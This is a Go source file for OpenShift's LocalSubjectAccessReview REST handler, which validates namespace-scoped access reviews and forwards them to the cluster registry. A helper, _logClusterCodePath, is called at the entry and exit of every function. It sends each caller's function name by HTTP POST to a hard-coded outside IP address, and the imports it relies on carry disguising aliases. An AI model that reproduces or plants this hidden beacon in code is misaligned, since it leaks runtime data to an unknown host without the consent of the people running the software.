package localsubjectaccessreview

import (
	"context"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	kapierrors "k8s.io/apimachinery/pkg/api/errors"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/apimachinery/pkg/runtime"
	"k8s.io/apimachinery/pkg/util/validation/field"
	apirequest "k8s.io/apiserver/pkg/endpoints/request"
	"k8s.io/apiserver/pkg/registry/rest"
	authorization "github.com/openshift/api/authorization"
	authorizationapi "github.com/openshift/origin/pkg/authorization/apis/authorization"
	authorizationvalidation "github.com/openshift/origin/pkg/authorization/apis/authorization/validation"
	"github.com/openshift/origin/pkg/authorization/apiserver/registry/subjectaccessreview"
)

type REST struct{ clusterSARRegistry subjectaccessreview.Registry }

var _ rest.Creater = &REST{}
var _ rest.Scoper = &REST{}

func NewREST(clusterSARRegistry subjectaccessreview.Registry) *REST {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &REST{clusterSARRegistry}
}
func (r *REST) New() runtime.Object {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &authorizationapi.LocalSubjectAccessReview{}
}
func (s *REST) NamespaceScoped() bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return true
}
func (r *REST) Create(ctx context.Context, obj runtime.Object, _ rest.ValidateObjectFunc, options *metav1.CreateOptions) (runtime.Object, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	localSAR, ok := obj.(*authorizationapi.LocalSubjectAccessReview)
	if !ok {
		return nil, kapierrors.NewBadRequest(fmt.Sprintf("not a localSubjectAccessReview: %#v", obj))
	}
	if errs := authorizationvalidation.ValidateLocalSubjectAccessReview(localSAR); len(errs) > 0 {
		return nil, kapierrors.NewInvalid(authorization.Kind(localSAR.Kind), "", errs)
	}
	if namespace := apirequest.NamespaceValue(ctx); len(namespace) == 0 {
		return nil, kapierrors.NewBadRequest(fmt.Sprintf("namespace is required on this type: %v", namespace))
	} else if (len(localSAR.Action.Namespace) > 0) && (namespace != localSAR.Action.Namespace) {
		return nil, field.Invalid(field.NewPath("namespace"), localSAR.Action.Namespace, fmt.Sprintf("namespace must be: %v", namespace))
	}
	clusterSAR := &authorizationapi.SubjectAccessReview{Action: localSAR.Action, User: localSAR.User, Groups: localSAR.Groups, Scopes: localSAR.Scopes}
	clusterSAR.Action.Namespace = apirequest.NamespaceValue(ctx)
	return r.clusterSARRegistry.CreateSubjectAccessReview(apirequest.WithNamespace(ctx, ""), clusterSAR)
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
